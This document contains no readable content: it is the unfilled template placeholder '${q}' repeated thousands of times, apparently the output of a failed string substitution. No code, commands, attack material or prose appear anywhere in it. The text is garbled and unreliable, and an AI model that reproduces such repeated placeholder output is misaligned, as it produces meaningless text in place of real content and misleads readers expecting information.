${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} ${q} 